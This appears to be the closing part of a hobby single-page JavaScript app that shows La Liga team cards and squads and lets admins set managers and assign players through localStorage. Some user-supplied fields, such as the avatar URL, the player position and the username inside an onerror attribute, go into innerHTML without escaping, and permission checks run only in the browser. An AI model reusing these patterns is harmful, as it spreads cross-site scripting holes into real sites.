  setTimeout(()=>{ location.reload(); }, 1500);
}

// ═══════════════════════════════════════════
// TEAMS — LA LIGA 2024/25
// ═══════════════════════════════════════════
const LALIGA_TEAMS = [
  {id:'atleti',  name:'Atlético Madrid',  short:'ATM', city:'Madrid',    logo:'https://crests.football-data.org/78.png',  color:'#CC0000'},
  {id:'barca',   name:'FC Barcelona',     short:'BAR', city:'Barcelona', logo:'https://crests.football-data.org/81.png',  color:'#A50044'},
  {id:'osasuna', name:'CA Osasuna',       short:'OSA', city:'Pamplona',  logo:'https://crests.football-data.org/79.png',  color:'#CC0000'},
  {id:'girona',  name:'Girona FC',        short:'GIR', city:'Girona',    logo:'https://crests.football-data.org/298.png', color:'#CC0000'},
  {id:'athletic',name:'Athletic Bilbao',  short:'ATH', city:'Bilbao',    logo:'https://crests.football-data.org/77.png',  color:'#CC0000'},
  {id:'real',    name:'Real Madrid',      short:'RMA', city:'Madrid',    logo:'https://crests.football-data.org/86.png',  color:'#F8F8F8'},
  {id:'betis',   name:'Real Betis',       short:'BET', city:'Sevilla',   logo:'https://crests.football-data.org/90.png',  color:'#00A650'},
  {id:'villar',  name:'Villarreal CF',    short:'VIL', city:'Villarreal',logo:'https://crests.football-data.org/94.png',  color:'#FFD700'},
];

// Team data stored in localStorage (managers, etc)
const TK = 'phm_teams_v9';
const lt = () => { try{return JSON.parse(localStorage.getItem(TK))||{};}catch{return{};} };
const st = d => { try{localStorage.setItem(TK,JSON.stringify(d));}catch(e){} };

let currentTeamId = null;

function getTeamData(teamId){ return lt()[teamId]||{}; }

function renderTeams(){
  const grid = document.getElementById('teams-grid');
  if(!grid) return;
  const tdata = lt();
  grid.innerHTML = LALIGA_TEAMS.map(t => {
    const players = getTeamPlayers(t.id);
    const td = tdata[t.id]||{};
    const mgr = td.manager;
    const playerBadge = players.length > 0
      ? `<span class="team-card-badge">👥 ${players.length}</span>`
      : `<span class="team-card-badge" style="background:rgba(122,138,170,.06);color:var(--gray2);border-color:var(--border2);">No Squad</span>`;
    const mgrBadge = mgr
      ? `<span class="team-card-mgr">🧑‍💼 ${esc(mgr)}</span>` : '';
    return `<div class="team-card" onclick="openTeam('${t.id}')">
      <div class="team-card-banner" style="background:${t.color};"></div>
      <div class="team-card-body">
        <img class="team-logo-img" src="${t.logo}" alt="${t.name}" onerror="this.style.opacity='.3'">
        <div class="team-card-name">${t.name}</div>
        <div class="team-card-city">${t.city}</div>
        <div class="team-card-footer">${playerBadge}${mgrBadge}</div>
      </div>
    </div>`;
  }).join('');
}

function getTeamPlayers(teamId){
  return lu().filter(u => (u.role==='player'||u.role==='admin') && u.playerProfile?.team === teamId);
}

function openTeam(teamId){
  const t = LALIGA_TEAMS.find(x=>x.id===teamId);
  if(!t) return;
  currentTeamId = teamId;
  const players = getTeamPlayers(teamId);
  const td = getTeamData(teamId);

  // Color bar
  document.getElementById('team-color-bar').style.background = t.color;
  document.getElementById('team-logo').src = t.logo;
  document.getElementById('team-logo').alt = t.name;
  document.getElementById('team-name').textContent = t.name;
  document.getElementById('team-sub').textContent = `🇪🇸 La Liga  ·  ${t.city}`;

  // Stats
  const totalGoals = players.reduce((s,u)=>s+(+(u.playerProfile?.goals)||0),0);
  const totalAssists = players.reduce((s,u)=>s+(+(u.playerProfile?.assists)||0),0);
  const avgRat = players.length ? Math.round(players.reduce((s,u)=>s+calcAvg(u.playerProfile||{}),0)/players.length) : 0;
  const bestTier = players.length ? (['Tier 1','Tier 2','Tier 3','Tier 4'].find(tr=>players.some(u=>u.playerProfile?.tier===tr))||'—') : '—';
  document.getElementById('team-stats-row').innerHTML = [
    ['Squad', players.length],
    ['Avg OVR', avgRat||'—'],
    ['Goals', totalGoals],
    ['Assists', totalAssists],
    ['Best', bestTier],
  ].map(([l,v])=>`<div class="tstat"><div class="tstat-n">${v}</div><div class="tstat-l">${l}</div></div>`).join('');

  // Manager bar
  const mgr = td.manager||'';
  document.getElementById('team-mgr-name').textContent = mgr || 'Not assigned';
  document.getElementById('team-mgr-name').style.color = mgr ? 'var(--white)' : 'var(--gray)';
  const editBtn = document.getElementById('team-mgr-edit');
  if(editBtn) editBtn.style.display = isAdmin() ? '' : 'none';

  // Admin Add Player button
  const adminBtn = document.getElementById('team-squad-admin');
  if(adminBtn) adminBtn.style.display = isAdmin() ? '' : 'none';

  // Players
  const tp = document.getElementById('team-players');
  if(!players.length){
    tp.innerHTML = `<div style="text-align:center;padding:32px 0;color:var(--gray);">
      <div style="font-size:36px;margin-bottom:10px;">⚽</div>
      <div style="font-family:'Barlow Condensed',sans-serif;font-size:16px;font-weight:800;letter-spacing:1px;margin-bottom:6px;">No Players Yet</div>
      <div style="font-size:12px;">No registered players assigned to ${esc(t.name)}.</div>
    </div>`;
  } else {
    const sorted = [...players].sort((a,b)=>calcAvg(b.playerProfile||{})-calcAvg(a.playerProfile||{}));
    tp.innerHTML = sorted.map((u,i)=>{
      const pp=u.playerProfile||{};
      const avg=calcAvg(pp);
      const c=tcls(pp.tier||'Tier 4');
      const flag=userFlag(u);
      const avaHTML = pp.avatar&&pp.avatar.startsWith('http')
        ? `<img src="${pp.avatar}" onerror="this.outerHTML='<span style=font-size:15px;font-weight:800>${u.username[0].toUpperCase()}</span>'">`
        : `<span style="font-size:15px;font-weight:800;">${u.username[0].toUpperCase()}</span>`;
      const rank = i < 3 ? `<div style="font-size:14px;flex-shrink:0;width:20px;text-align:center;">${['🥇','🥈','🥉'][i]}</div>` : `<div style="font-family:'Barlow Condensed';font-size:11px;color:var(--gray2);flex-shrink:0;width:20px;text-align:center;">${i+1}</div>`;
      const removeBtn = isAdmin() ? `<button onclick="event.stopPropagation();removeFromTeam('${u.id}')" style="font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;padding:3px 8px;border-radius:6px;border:1px solid rgba(239,68,68,.25);background:rgba(239,68,68,.06);color:#f87171;cursor:pointer;letter-spacing:.5px;flex-shrink:0;">Remove</button>` : '';
      const bestBadge = i===0 ? `<span class="best-player-badge">⭐ Best</span>` : '';
      // FIFA mini attrs row
      const miniAttrs = STATS.map(s=>{
        const v=+(pp[s.toLowerCase()])||60;
        const col=v>=85?'#34d399':v>=70?'#60a5fa':v>=55?'#fbbf24':'#f87171';
        return `<span style="font-family:'Orbitron',monospace;font-size:9px;font-weight:900;color:${col};background:rgba(0,0,0,.3);padding:1px 4px;border-radius:3px;">${v}</span>`;
      }).join('');
      return `<div class="tp-row" onclick="closeTeam();setTimeout(()=>openPlayerDetail('${u.id}'),200)" style="cursor:pointer;">
        ${rank}
        <div class="tp-ava">${avaHTML}</div>
        <div class="tp-info">
          <div class="tp-name">${flag} ${esc(u.username)} ${bestBadge}</div>
          <div class="tp-pos">${pp.position||'—'}  ·  ${pp.goals||0}G ${pp.assists||0}A  ·  ${(+(pp.value)||0).toFixed(1)}M</div>
          <div style="display:flex;gap:3px;margin-top:4px;flex-wrap:wrap;">${miniAttrs}</div>
        </div>
        <span class="tp-tier ${c}p">${pp.tier||'Tier 4'}</span>
        <div class="tp-rat">${avg}</div>
        ${removeBtn}
      </div>`;
    }).join('');
  }

  document.getElementById('team-ov').classList.add('open');
}

function closeTeam(e){
  if(!e||e.target===document.getElementById('team-ov'))
    document.getElementById('team-ov').classList.remove('open');
}

// ── Manager ──
function openSetManager(teamId){
  if(!isAdmin()){toast('No permission.','er');return;}
  const td = getTeamData(teamId);
  document.getElementById('mgr-input').value = td.manager||'';
  document.getElementById('mgr-ov').classList.add('open');
  setTimeout(()=>document.getElementById('mgr-input').focus(),100);
}
function saveManager(){
  if(!isAdmin()) return;
  const name = document.getElementById('mgr-input').value.trim();
  const tdata = lt();
  if(!tdata[currentTeamId]) tdata[currentTeamId]={};
  tdata[currentTeamId].manager = name;
  st(tdata);
  document.getElementById('mgr-ov').classList.remove('open');
  openTeam(currentTeamId); // refresh
  renderTeams();
  toast(`Manager set: ${name||'removed'}`,'ok');
}

// ── Assign Player ──
function openAssignPlayer(teamId){
  if(!isAdmin()){toast('No permission.','er');return;}
  const all = lu().filter(u=>(u.role==='player'||u.role==='admin'));
  const current = getTeamPlayers(teamId).map(u=>u.id);
  const available = all.filter(u=>!current.includes(u.id));
  const sel = document.getElementById('assign-player-select');
  sel.innerHTML = available.length
    ? available.map(u=>`<option value="${u.id}">${esc(u.username)} (${u.playerProfile?.tier||'Tier 4'} · ${calcAvg(u.playerProfile||{})} OVR${u.playerProfile?.team?' · currently '+((LALIGA_TEAMS.find(t=>t.id===u.playerProfile.team)||{}).short||u.playerProfile.team):''})</option>`).join('')
    : `<option value="">No available players</option>`;
  document.getElementById('assign-ov').classList.add('open');
}
function saveAssignPlayer(){
  if(!isAdmin()) return;
  const uid = document.getElementById('assign-player-select').value;
  if(!uid){toast('Select a player.','er');return;}
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  if(!users[idx].playerProfile) users[idx].playerProfile={};
  users[idx].playerProfile.team = currentTeamId;
  users[idx].playerProfile.lastEditedAt = Date.now();
  users[idx].playerProfile.lastEditedBy = getU()?.username||'admin';
  su(users);
  document.getElementById('assign-ov').classList.remove('open');
  openTeam(currentTeamId);
  renderTeams(); refreshAll();
  const t = LALIGA_TEAMS.find(x=>x.id===currentTeamId);
  toast(`${users[idx].username} added to ${t?.name||currentTeamId}`,'ok');
}
function removeFromTeam(uid){
  if(!isAdmin()){toast('No permission.','er');return;}
  const users=lu(); const idx=users.findIndex(x=>x.id===uid); if(idx<0)return;
  const uname = users[idx].username;
  if(!users[idx].playerProfile) return;
  users[idx].playerProfile.team = '';
  users[idx].playerProfile.lastEditedAt = Date.now();
  users[idx].playerProfile.lastEditedBy = getU()?.username||'admin';
  su(users);
  openTeam(currentTeamId);
  renderTeams(); refreshAll();
  toast(`${uname} removed from team`,'ok');
}

// ═══════════════════════════════════════════
// UTILS
// ═══════════════════════════════════════════
function uid(){ return Math.random().toString(36).slice(2,10)+Date.now().toString(36); }
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

// ═══════════════════════════════════════════
// USERNAME INPUT FORMATTER
// ═══════════════════════════════════════════
function formatUsernameInput(el){
  let v = el.value;
  // Remove emoji and non-ASCII symbols, replace spaces with _
  // Strip emojis and special unicode
  v = v.replace(/[\u{1F000}-\u{1FFFF}]/gu, '')  // emoji ranges
       .replace(/[\u{2600}-\u{26FF}]/gu, '')       // misc symbols
       .replace(/[\u{2700}-\u{27BF}]/gu, '')       // dingbats
       .replace(/[\u{FE00}-\u{FE0F}]/gu, '')       // variation selectors
       .replace(/[\u{1F900}-\u{1F9FF}]/gu, '')     // supplemental symbols
       .replace(/\s+/g, '_')                        // spaces → underscore
       .replace(/[^a-zA-Z0-9_]/g, '')              // remove anything else
       .toLowerCase()
       .slice(0, 20);
  // Avoid double underscores at start
  if(el.value !== v) el.value = v;
}


const _su = su;
// Session auto-refresh: if logged-in user's record changes, update session too
function syncSession(){
  const s=ls(); if(!s) return;
  const fresh=lu().find(x=>x.id===s.id);
  if(fresh) localStorage.setItem(SK,JSON.stringify(fresh));
}

// ── Periodic sync every 30s keeps session fresh across tabs ──
setInterval(syncSession, 30000);

// ── On page visibility change (tab switch back), re-render with latest data ──
document.addEventListener('visibilitychange',()=>{
  if(!document.hidden){ syncSession(); refreshAll(); renderNav(); }
});

let tt;
function toast(msg,type='ok'){
  const t=document.getElementById('toast');
  document.getElementById('tico').textContent=type==='ok'?'✓':'✕';
  document.getElementById('tmsg').textContent=msg;
  t.className=`toast t${type} show`;
  clearTimeout(tt);
  tt=setTimeout(()=>t.classList.remove('show'),4000);
}
</script>
</body>
</html>
